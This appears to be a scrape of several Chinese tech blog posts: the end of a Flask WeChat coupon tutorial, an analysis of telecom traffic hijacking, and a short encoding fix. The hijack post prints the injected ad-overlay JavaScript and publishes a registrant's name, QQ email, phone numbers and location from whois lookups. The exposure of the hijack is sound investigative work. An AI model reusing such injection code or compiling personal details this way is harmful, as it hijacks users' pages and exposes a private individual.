            card_ticket = get_ticket(access_token['access_token'], ""wx_card"") # 这个单独的方法是获取卡券专用ticket方法，这个跟上面那个ticket是有区别的，官方文档也有详细说明原因，此ticket的使用也有次数限制，所以也需要做缓存
            cardapi_ticket = card_ticket['ticket']
            card_timestamp = str(int(time.time()))
            card_noncestr = createNonceStr()
            fuck_dic_list = sorted([cardapi_ticket, card_timestamp, card_id, card_noncestr])
            card_string = ""%s%s%s%s"" % (fuck_dic_list[0], fuck_dic_list[1], fuck_dic_list[2], fuck_dic_list[3])

            sha_card = hashlib.sha1(card_string.encode('utf8'))
            card_signature = sha_card.hexdigest()

            card_data = {
                ""timestamp"": card_timestamp,
                ""nonce_str"": card_noncestr,
                ""signature"": card_signature
            }
            # 以上这一段是生成卡券用的签名等参数，这些参数用于卡券的功能调用


            # 获取用户信息接口，注意，此接口使用的是微信登录所拿到的token，微信还有个获取用户信息的接口，可以获取微信是否关注公众号，那个接口使用的是基础access_token，有次数限制，具体使用哪个要看个人业务需求
            # 最开始的时候客户是要根据用户是否关注公众号来判断用户是否可以参与活动，后面跟我说不要这个需求了，所以下面的变量写了follow就没有改
            wx_userinfo_url = ""https://api.weixin.qq.com/sns/userinfo?access_token=%s&amp;openid=%s"" % (wx_login_token['access_token'], session['openid'])
            follow_response = json.loads(requests.get(url=wx_userinfo_url, timeout=15).content.decode('utf8'))

            wx_openid = session['openid']
            wx_nickname = follow_response['nickname']
            wx_headimgurl = follow_response['headimgurl']
            wx_sex = follow_response['sex']
            wx_hostip = request.headers['Remote-Host'] # 获取一个请求的IP，不一定准确，需要配合下面的参数使用
            wx_xip = request.headers['X-Forwarded-For']  # flask 获取用户的真实IP，有时候这个地方有两个值，一个是wifi的ip，一个是4G的ip，但是都有可能被用户伪造

            mysql_db = Database()
            query_sql = ""SELECT addcard FROM wx_users WHERE `openid`=%s""
            query_result = mysql_db.query(query_sql, [session['openid']])
            if len(query_result) &gt; 0:
                if query_result[0][0] == 0:
                    page_status = ""1""
                else:
                    page_status = ""2""
            else:
                insert_sql = ""INSERT INTO wx_users (`openid`,`nickname`,`headimgurl`,`sex`,`hostip`,`x-for-ip`) VALUES (%s,%s,%s,%s,%s,%s)""
                mysql_db.insert(insert_sql, [wx_openid, wx_nickname, wx_headimgurl, wx_sex, wx_hostip, wx_xip])
                page_status = ""1""

            return render_template(""index.html"", status=page_status, jssdk=jssdk_data, cardId=card_id, cardExt=card_data)
        except Exception as e:
            return redirect(""http://coupon.abc.com"")</pre>
代码里面涉及到的两个单独方法如下，第一个获取基础access_token
<pre class=""brush:py;"">def get_access_token(appid, app_secret):
    access_token_file = sys.path[0] + '/access_token.json' # 将获取到的token缓存到本地文件，上面说过这个token是有使用次数限制的
    wx_access_token_url = ""https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=%s&amp;secret=%s"" % (appid, app_secret)
    try:
        if os.path.exists(access_token_file): # 缓存文件存在的时候就直接读缓存
            access_token = open(access_token_file).readline()

            token_string = access_token.split('|')[0]
            last_time = int(access_token.split('|')[1])
            current_time = int(time.time())

            if current_time &gt; last_time: # 判断是否达到了过期时间，原本过期时间为7200秒，我写了6000，提前一点重新获取
                token_string = requests.get(url=wx_access_token_url, timeout=15).content.decode('utf8')
                signa_expire_time = str(int(time.time() + 6000))
                with open(access_token_file, 'wb') as f:
                    f.write(str.encode(token_string + '|' + signa_expire_time))
                    f.flush()
                    f.close()
        else: # 没有缓存文件的时候就去微信服务器获取
            token_string = requests.get(url=wx_access_token_url, timeout=15).content.decode('utf8')
            signa_expire_time = str(int(time.time() + 6000))
            with open(access_token_file, 'wb') as f:
                f.write(str.encode(token_string + '|' + signa_expire_time))
                f.flush()
                f.close()
        return json.loads(token_string)
    except Exception as e:
        return jsonify({""code"": -1, ""msg"": str(e)}) # jsonify 方法可以直接转换成json很方便，也可以用json库进行转换，常用的有json.loads(str)和json.dump(json)方法</pre>
第二个单独方法是获取ticket，请求的方式一样，唯独参数值不一样
<pre class=""brush:py;"">def get_ticket(access_token, ticket_type):
    if ticket_type == 'wx_card':
        ticket_file = sys.path[0] + '/jsapi_signa_ticket.json'
    else:  # jsapi
        ticket_file = sys.path[0] + '/jsapi_ticket.json'
    wx_ticket_url = ""https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=%s&amp;type=%s"" % (access_token, ticket_type)
    try:
        if os.path.exists(ticket_file):
            ticket = open(ticket_file).readline()

            ticket_string = ticket.split('|')[0]
            last_time = int(ticket.split('|')[1])
            current_time = int(time.time())

            if current_time &gt; last_time:
                ticket_string = requests.get(url=wx_ticket_url, timeout=15).content.decode('utf8')
                signa_expire_time = str(int(time.time() + 6000))
                with open(ticket_file, 'wb') as f:
                    f.write(str.encode(ticket_string + '|' + signa_expire_time))
                    f.flush()
                    f.close()
        else:
            ticket_string = requests.get(url=wx_ticket_url, timeout=15).content.decode('utf8')
            signa_expire_time = str(int(time.time() + 6000))
            with open(ticket_file, 'wb') as f:
                f.write(str.encode(ticket_string + '|' + signa_expire_time))
                f.flush()
                f.close()
        return json.loads(ticket_string)
    except Exception as e:
        return jsonify({""code"": -1, ""msg"": str(e)})</pre>
这两个方法获取回来的数据都需要进行缓存。
<p>
	前端页面在加载的时候需要初始化微信分享和卡券的相关签名参数等，所以需要把前面生成的签名数据传过去，通过render就可以轻松传到前端，render这个东西不要觉得有多神秘，搞过nodejs和thinkphp的估计也都见过，如下代码
</p>
<pre class=""brush:py;"">return render_template(""index.html"", status=page_status, jssdk=jssdk_data, cardId=card_id, cardExt=card_data)</pre>
前端拿数据也是非常简单，如下
<pre class=""brush:py;"">&lt;div class=""mainBody""&gt;
        {% if status == '1' %}
            &lt;div class=""page_index""&gt;&lt;/div&gt;
            &lt;div class=""page_info""&gt;
                &lt;div class=""formbox""&gt;
                    &lt;div&gt;&lt;img src=""/static/img/text-index.png""&gt;&lt;/div&gt;
                    &lt;div&gt;&lt;img src=""/static/img/input-name.png""&gt;&lt;input type=""text"" v-model=""username"" maxlength=""30""&gt;&lt;/div&gt;
                    &lt;div&gt;&lt;img src=""/static/img/input-carnum.png""&gt;&lt;input type=""text"" v-model=""carnumber"" maxlength=""8""&gt;&lt;/div&gt;
                    &lt;div&gt;&lt;img src=""/static/img/input-carmod.png""&gt;&lt;input type=""text"" v-model=""carmodal"" maxlength=""30""&gt;&lt;/div&gt;
                    &lt;div&gt;&lt;img src=""/static/img/input-phone.png""&gt;&lt;input type=""tel"" v-model=""userphone"" maxlength=""11""&gt;&lt;/div&gt;
                    &lt;a href=""javascript:;"" @click=""postData""&gt;&lt;img src=""/static/img/button-save.png""&gt;&lt;/a&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        {% elif status == '2' %}
            &lt;div class=""page_finish""&gt;&lt;img src=""/static/img/page4.png""&gt;&lt;/div&gt;
        {% endif %}</pre>
JInja2使用了{%  %}识别逻辑判断等，看起来是不是很像jsp或者thinkphp？其实写起来都差不多，直接输出数据如下
<pre class=""brush:py;"">wx.config({
            debug: false,
            appId: '[[ jssdk.appId ]]',
            timestamp: '[[ jssdk.timestamp ]]',
            nonceStr: '[[ jssdk.nonceStr ]]',
            signature: '[[ jssdk.signature ]]',
            jsApiList: ['onMenuShareTimeline','onMenuShareAppMessage','addCard']
        });

        wx.ready(function () {
            wxSetShare();
        });

        function wxSetShare(){
            //朋友圈分享
            wx.onMenuShareTimeline({
                title: wx_shareTitle,
                link:  wx_shareurl,
                imgUrl: wx_imgUrl,
                success: function () {},
                cancel: function () {console.log('share cancel')}
            });
            //发送给朋友
            wx.onMenuShareAppMessage({
                title: wx_shareTitle,
                desc:  wx_shareContent,
                link:  wx_shareurl,
                imgUrl: wx_imgUrl,
                type: 'link',
                dataUrl: '',
                success: function () {},
                cancel: function () {console.log('share cancel')}
            });
        }

        var cardExtString = '{""timestamp"":""[[ cardExt.timestamp ]]"",""nonce_str"":""[[ cardExt.nonce_str ]]"",""signature"":""[[ cardExt.signature ]]""}';

        function addCoupon() {
            wx.addCard({
                cardList: [{
                    cardId: '[[ cardId ]]',
                    cardExt: cardExtString
                    }],
                success: function (res) {
                    axios.post('/addCard').then(function (response) {
                        if(response.data.code === 0){
                            window.location.reload(true)
                        }else{
                            weui.alert(response.data.msg);
                        }
                    }).catch(function (error) {
                        weui.alert(error);
                    });
                }
            });
        }</pre>
在[[  ]]里面直接就输出了数据，这里有个大坑，看下面这段代码
<pre class=""brush:py;"">var cardExtString = '{""timestamp"":""[[ cardExt.timestamp ]]"",""nonce_str"":""[[ cardExt.nonce_str ]]"",""signature"":""[[ cardExt.signature ]]""}';

        function addCoupon() {
            wx.addCard({
                cardList: [{
                    cardId: '[[ cardId ]]',
                    cardExt: cardExtString
                    }],
                success: function (res) {
                    axios.post('/addCard').then(function (response) {
                        if(response.data.code === 0){
                            window.location.reload(true)
                        }else{
                            weui.alert(response.data.msg);
                        }
                    }).catch(function (error) {
                        weui.alert(error);
                    });
                }
            });
        }</pre>
里面有个
<pre class=""brush:py;"">cardExt: cardExtString</pre>
微信官方的写法是
<pre class=""brush:py;"">wx.addCard({
	cardList: [{
	    cardId: '[[ cardId ]]',
	    cardExt: {
		timestamp:""×××××"",
		nonce_str:""×××××"",
		signature:""×××××""
		}
	    }],
	success: function (res) {
	    axios.post('/addCard').then(function (response) {
		if(response.data.code === 0){
		    window.location.reload(true)
		}else{
		    weui.alert(response.data.msg);
		}
	    }).catch(function (error) {
		weui.alert(error);
	    });
	}
});</pre>
如果替换掉Jinja2的识别符应该就是
<pre class=""brush:py;"">wx.addCard({
	cardList: [{
	    cardId: '[[ cardId ]]',
	    cardExt: {
		timestamp:""[[ cardExt.timestamp ]]"",
		nonce_str:""[[ cardExt.nonce_str ]]"",
		signature:""[[ cardExt.signature ]]""
		}
	    }],
	success: function (res) {
	    axios.post('/addCard').then(function (response) {
		if(response.data.code === 0){
		    window.location.reload(true)
		}else{
		    weui.alert(response.data.msg);
		}
	    }).catch(function (error) {
		weui.alert(error);
	    });
	}
});</pre>
在自己安卓手机上测试通过，发给客户，客户一直说他的手机不行，提示签名错误，我就郁闷了，我这里测试很多遍都可以啊，要求客户发截图，截图发来看看确实签名错误，神奇了。仔细一看，客户用的是IPhone，难道是安卓可以ios不行，经过长达4个小时的不断尝试，终于给解决问题了，开启微信jssdk的调试模式后在安卓和ios上都会弹窗提示普通jssdk的签名正确，安卓上面领取优惠券成功后会显示优惠券相关信息，仔细一看发现双引号被转义各种斜杠，但是是成功的，然而iphone不行，此时我才想起这个坑我之前就遇到过，因为ios解析json的时候认为{}里面的是一个json对象，会把一些字符转义，导致签名字符串不一致，所以签名错误，而安卓则认为{}是一个字符串，正常的处理，就不会报错。
<p>
	于是就有了上面那个
</p>
<pre class=""brush:py;"">var cardExtString = '{""timestamp"":""[[ cardExt.timestamp ]]"",""nonce_str"":""[[ cardExt.nonce_str ]]"",""signature"":""[[ cardExt.signature ]]""}';</pre>
直接定义成一个字符串，这样安卓和ios识别就会一致的认为这个变量为字符串类型，不会做特殊处理，至此BUG解决。
<p>
	这里顺便说下axios，使用方法如下代码
</p>
<pre class=""brush:py;"">axios.post('/addCard').then(function (response) {
                        if(response.data.code === 0){
                            window.location.reload(true)
                        }else{
                            weui.alert(response.data.msg);
                        }
                    }).catch(function (error) {
                        weui.alert(error);
                    });</pre>
简单易用，通俗易懂。
<h2>
	部署
</h2>
<p>
	项目上线部署到阿里云上，使用的是系统是CentOS 7，Python3 + virtualenv + supervisor +  gunicorn + nginx 具体部署方法我之前也专门写文章讲过，关于部署这块如果有同学不懂或者不清楚部署方法的话可以邮箱联系我。
</p>
<h2>
	后记
</h2>
<p>
	遇到问题多谷歌，经验真的很重要啊！！！
</p>
<p>
	关于项目代码或者对微信相关功能开发的问题，可以发到我邮箱。
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23465 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-12-19, 6:27 PM. 
发表在：
								
 ,Python,
								
,  ,经验分享,
								
,  ,前端技术,
								
,  ,原创,
",Flask 微信卡券小项目从开发到上线
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	每到年底，网络劫持就要来一波，不管是运营商还是黑产帝都不放过这一年一度的黄金时段，可以说是年年有今日岁岁有今朝，今天已经是12月，距离过年已经不久了，各种运营商内鬼和黑产帝们显然已经蠢蠢欲动，我之前写过关于运营商流量劫持的利益链关系，而每到年底，又是大家钱包满满开开心心过年的大好时机，花钱娱乐潇洒也是情理之中，运营商里面的一些内鬼自然不能放过这个机会，于是随处可见的流量劫持，铺天盖地的袭来。
</p>
如果我记得没错，去年年底移动的流量劫持最为猖狂，先不说宽带上的劫持，各种跳转也就算了，就连手机上的4G都特么的是一大堆弹窗广告，我艹NMB的流量劫持，你特么就那么缺钱？4G你特么也弹？你特么天天弹个JB夺宝，夺个JB的宝，CNM的夺宝，弹了夺宝弹棋牌，实在不行给你跳转个黄站，再来个什么葡京赌场，我赌NMB啊，别特么以为我不知道是你们自己人干的，就那点JB破站点，一眼就看出来其中的利益链，还遮遮掩掩跳来跳去换IP搞什么CDN。
<p>
	好了，不吐槽移动了，反正吐槽了也没用，每年年底都要来一波的，今天来说说电信的劫持。
</p>
<h2>
	分析
</h2>
<p>
	之前写过电信跳转情色APP的案例，这次写一写弹窗吧。
</p>
<p>
	是这样的，博主已经很久没有上微博了，大概有个两三年了吧，今天想登录下微博，就打开浏览器输入了weibo.com，稍等一会就打开了，但是似乎有点不对</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=619"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201712/8f0ad61461ffe92a16b2a6544e736516.png"" alt=""2017-12-12 23-07-44屏幕截图.png - 大小: 716.9 KB - 尺寸: 1280 x 999 - 点击打开新窗口浏览全图"" width=""900"" height=""703""></a></div>比如图片上右下角的那个弹窗，怎么看怎么畸形，这图做的也太草率了吧，有点专业水平好吗？而且，这一看就是黄色网站的广告啊，人家微博也不会放这种广告对不对，好歹你也跳一个有点关联的广告啊喂，太不专业了。

<p>
	观察浏览器地址栏，weibo.com是应该有https证书的，但是这里明显没有带上https，没有进行强制https，所以让运营商有机可乘！
</p>
<p>
	顺手F12看下页面的结构，如图所示</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=620"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201712/9b0b6664abe66a716c3e3ec76e6ecc85.png"" alt=""2017-12-12 23-11-49屏幕截图.png - 大小: 207.33 KB - 尺寸: 1280 x 999 - 点击打开新窗口浏览全图"" width=""900"" height=""703""></a></div>图中显示真正的微博页面被嵌入到了一个iframe里面，弹窗广告也被嵌入到一个iframe里面<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=621"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201712/cb4cd518c42caf2e858868828cb31162.png"" alt=""2017-12-12 23-55-23屏幕截图.png - 大小: 144.2 KB - 尺寸: 865 x 535 - 点击打开新窗口浏览全图"" width=""865"" height=""535""></a></div>这样看来其实整个页面就是运营商返回的，这种链路劫持一般来说只能由电信运营商的设备自动化完成，so？？？

<p>
	下面来看下这个虚假页面的一些代码，先看js部分，这个段js代码是由运营商的服务器自动生成，用于控制广告，代码如下
</p>
<pre class=""brush:js;"">var m = ""http://weibo.com/"";
var a = ""http://m.vivi997.com/qiyi/"";
var w = window;
var n = navigator;
var d = document;

function ad() {
	var md, adh, adw;
	var ua = n.userAgent.toLowerCase();
	var isipad = ua.match(/ipad/i) == ""ipad"";
	var isiphone = ua.match(/iphone os/i) == ""iphone os"";
	var ismidp = ua.match(/midp/i) == ""midp"";
	var isuc7 = ua.match(/rv:1.2.3.4/i) == ""rv:1.2.3.4"";
	var isuc = ua.match(/ucweb/i) == ""ucweb"";
	var isandroid = ua.match(/android/i) == ""android"";
	var isce = ua.match(/windows ce/i) == ""windows ce"";
	var iswm = ua.match(/windows\s*mobile/i) == ""windows mobile"";
	if (isandroid || isiphone || isipad || iswm) {
		var meta = d.createElement(""meta"");
		meta.name = ""viewport"";
		meta.content = ""width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no"";
		d.getElementsByTagName(""head"")[0].appendChild(meta);
		md = d.body.clientWidth;
		adh = Math.ceil(md / 320 * 60);
		adw = ""100%""
	} else {
		adh = ""250"";
		adw = ""300""
	}
	var div0 = d.createElement(""div"");
	div0.id = ""i"";
	d.getElementsByTagName(""body"")[0].appendChild(div0);
	var ifr0 = d.createElement(""iframe"");
	ifr0.id = ""m"";
	ifr0.width = ""100%"";
	ifr0.height = ""100%"";
	ifr0.setAttribute(""frameborder"", ""0"");
	ifr0.src = m + (m.indexOf(""?"") &lt; 0 ? '?' : '&amp;') + ""_ad"" + Math.random();
	d.getElementById(""i"").appendChild(ifr0);
	var div1 = d.createElement(""div"");
	div1.id = ""x"";
	div1.style.width = adw;
	div1.style.height = adh + ""px"";
	div1.style.display = ""none"";
	d.getElementsByTagName(""body"")[0].appendChild(div1);
	var a0 = d.createElement(""a"");
	a0.setAttribute(""onClick"", ""clo();"");
	a0.innerHTML = ""x"";
	d.getElementById(""x"").appendChild(a0);
	var e0 = d.createElement(""em"");
	e0.id = ""e0"";
	e0.innerHTML = ""广告"";
	d.getElementById(""x"").appendChild(e0);
	var ifr1 = d.createElement(""iframe"");
	ifr1.id = ""a"";
	ifr1.width = adw;
	ifr1.height = adh;
	ifr1.setAttribute(""frameborder"", ""0"");
	ifr1.setAttribute(""marginheight"", ""0"");
	ifr1.setAttribute(""marginwidth"", ""0"");
	ifr1.src = a;
	d.getElementById(""x"").appendChild(ifr1);
	var im = d.getElementById(""m"");
	if (isiphone || isipad) {
		im.width = d.body.clientWidth;
		im.scrolling = ""no""
	}
}
function clo() {
	d.getElementById(""x"").style.display = ""none""
}
setTimeout(""clo()"", 300000);
setTimeout(function() {
	d.getElementById(""x"").style.display = ""block""
}, 1000);</pre>
这段代码写的还是比较6的，不仅仅做了完善的设备类型检查，还可以自适应设备的屏幕，兼容性强了不少，而且设定了30秒后广告弹窗关闭，就是这段简短的代码产生了如此神奇的页面。
<p>
	这段代码的关键点就在这里 http://m.vivi997.com/qiyi/ ，这就是那个广告iframe所嵌入的url，先看看这个域名的相关信息，信息显示此域名注册人为赵敏，我说这位哥，你的张无忌哥哥现在还好吗？
</p>
<p>
	注册性质为个人注册，备案号 浙ICP备16001403号 是重点，反查这个备案号，发现赵敏同时备案了很多域名，列表如下
</p>
<pre class=""brush:js;"">序号 	主办单位名称 	主办单位性质 	网站备案/许可证号 	网站名称 	网站首页网址 	审核时间 	是否限制接入 	详细信息
1 	赵敏 	个人 	浙ICP备16001403号-1 	好易网 	www.apkopb7.com	2016-05-12 	否 	详细
2 	赵敏 	个人 	浙ICP备16001403号-10 	品尚网 	www.22ccg.com	2016-05-12 	否 	详细
3 	赵敏 	个人 	浙ICP备16001403号-11 	tm时尚 	www.ma789v.com	2016-05-12 	否 	详细
4 	赵敏 	个人 	浙ICP备16001403号-12 	找大牌 	www.9113529.com	2016-05-12 	否 	详细
5 	赵敏 	个人 	浙ICP备16001403号-13    9966导航 www.schoolf4.com 2016-05-12 	否 	详细
6 	赵敏 	个人 	浙ICP备16001403号-2 	聚惠网 	www.sxdzrmv.com	2016-05-12 	否 	详细
7 	赵敏 	个人 	浙ICP备16001403号-3 	时尚坞 	www.66y77u8.com	2016-05-12 	否 	详细
8 	赵敏 	个人 	浙ICP备16001403号-4 	享趣网 	www.xarm688.com	2016-05-12 	否 	详细
9 	赵敏 	个人 	浙ICP备16001403号-5 	依人网 	www.fqceyqo.com	2016-05-12 	否 	详细
10 	赵敏 	个人 	浙ICP备16001403号-6 	品聚惠 	www.90wwq.com	2016-05-12 	否 	详细
11 	赵敏 	个人 	浙ICP备16001403号-7 	久美网 	www.mapvoo.com	2016-05-12 	否 	详细
12 	赵敏 	个人 	浙ICP备16001403号-8 	任我挑 	www.vivi997.com	2016-05-12 	否 	详细
13 	赵敏 	个人 	浙ICP备16001403号-9 	如意网 	www.hg4fa.com	2016-05-12 	否 	详细</pre>
查询whois找到邮箱 <span>3043738376@qq.com，反差邮箱发现赵敏还注册了非常多域名，这是流量劫持常用的套路，经常换域名，域名信息如下
<pre class=""brush:js;"">序号	域名	注册者	邮箱	电话	注册商	DNS	注册时间	过期时间
1	22ccg.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2016/3/29 0:00:00	2018/3/29 0:00:00
2	3944540.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
3	4832880.com	 zhao min	3043738376@qq.com	57186737106	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
4	66y77u8.com	zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
5	7180443.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
6	7637960.com	ZhaoMin	        3043738376@qq.com	57186737106	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
7	90wwq.com	zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2016/3/29 0:00:00	2018/3/29 0:00:00
8	avjgjol.com	 zhao min	3043738376@qq.com	95187	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
9	boyoll.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2016/3/29 0:00:00	2018/3/29 0:00:00
10	d7ag8.com	 zhao min	3043738376@qq.com	57186737106	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
11	fi5od9.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
12	fkku194.com	 zhao min	3043738376@qq.com	95187	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
13	fqceyqo.com	zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2016/12/30 0:00:00
14	hnhabc.com	 zhao min	3043738376@qq.com	95187	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2016/3/29 0:00:00	2018/3/29 0:00:00
15	mapvoo.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2016/3/29 0:00:00	2018/3/29 0:00:00
16	qlg02.com	 zhao min	3043738376@qq.com	95187	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
17	vivi997.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2016/3/29 0:00:00	2018/3/29 0:00:00
18	wotish.com	 zhao min	3043738376@qq.com	95187	 HiChina Zhicheng Technology Ltd	F1G1NS1.DNSPOD.NET, F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00
19	xarm688.com	 zhao min	3043738376@qq.com		HICHINA ZHICHENG TECHNOLOGY LTD.	F1G1NS1.DNSPOD.NET,F1G1NS2.DNSPOD.NET	2015/12/30 0:00:00	2017/12/30 0:00:00</pre>
</span> 
<p>
	<span> 从这些网址上来看，这个赵敏似乎是个做推广的，但是仔细一想，这两年菠菜广告打击力度大，好多流量劫持的都跑去做推广也算正常。这些网址打开全部指向同一个ip地址 218.93.127.125 ，而且默认首页也只是显示hello world，很明显是用了子目录，比如 qiyi 就是其中一个子目录，当然肯定不止做了爱奇艺这一个推广，爱奇艺的推广链接为 http://vip.iqiyi.com/?fv=zz_575fbcda2e772-846430-00wjf6050a0570e90613 ，那么有的同学就要问了，干嘛搞一个黄色广告条结果推广的是正规视频网站？这你就有所不知了，这么做一是为了规避法律风险，至少不会涉黄，其次是因为爱奇艺给出了的佣金也是相当不错，20块钱的会员佣金能给到3块到5块，这么算，流量劫持带来的利润也是相当的可观。</span> 
</p>
<p>
	<span>查看图片的src为 http://www.vivi997.com/qiyi/1031.jpg 图片名称似乎是日期，页面访问也就一个很简单的静态页面，没有什么有价值的信息，得想想其他办法。</span> 
</p>
<p>
	<span>根据QQ邮箱查询到此人QQ昵称为子非鱼，QQ空间未发表任何信息，应该是小号，位置显示浙江杭州，结合whois信息，浙江杭州天堂软件园应该是没错。</span> 
</p>
<p>
	<span>扫描IP地址 218.93.127.125（江苏省常州市  电信） 发现只开放了80和443端口，安全意识还是不错的。</span> 
</p>
<p>
	<span>至此没有获取到更多有用的信息...<br>
</span> 
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23464 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-12-13, 12:23 AM. 
发表在：
								
 ,攻击测试,
",一个电信劫持案例的简要分析
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	关于字符编码问题在Py2中经常碰到，但是Py3在字符编码这块做了不少的改进，但是有些特殊情况下还是会出现问题。今天碰到了一个神奇的字符问题...
</p>
<p>
	博主之前写过一个网站的爬虫，去定时爬某个站点的评论内容，已经稳定运行两个月，每次抓取完成后会推送一条微信消息到手机上，但是这两周以来一直没有推送，觉得很奇怪，难道网站内容改版了？
</p>
<h2>
	分析
</h2>
<p>
	由于脚本跑在美国VPS服务器上，先使用浏览器打开网站查看网页源代码，发现网站结构并没有变，难道是登录的session失效了？因为之前出现过session失效的情况，那是因为两次抓取中间间隔时间太长导致的，后来调整到每一个小时都去请求一个，以保证session存活。按照道理来说不应该出现session失效的问题，因为脚本自动运行的时候会在每天0点10分的时候进行签到操作，签到完成也会推送微信消息，这个签到消息一直都是正常的，只有抓取出现了问题。
</p>
<p>
	看来只能把脚本拖下来调试了，本地运行脚本，提示错误
</p>
<pre class=""brush:bash;""> 'gb2312' codec can't decode byte 0x89 in position 42485: illegal multibyte sequence</pre>
神奇了，这个问题之前都没有出现过，再次打开网站查看源代码发现编码并没有变，确定是gb2312没有问题的，神奇了，既然页面上编码是正确的，为何会报错呢？
<p>
	根据之前做过微信相关应用的经验想到会不会是因为一些字符导致的解码失败，比如一些神奇的表情或者泰国文字，如果是这样那就简单了，使用一种范围更大的字符编码进行解码应该就可以了。
</p>
<p>
	根据谷歌结果得知使用gb18030即可，修改代码后成功解码无报错
</p>
<pre class=""brush:py;"">jifen_data = s.get(url=url_jifen, headers=headers, cookies=cookies_pc, timeout=10).content.decode('gb18030')</pre>
<h2>
	参考
</h2>
<p>
	http://blog.csdn.net/junkichan/article/details/51913845
</p>
<p>
	<br>
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23463 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
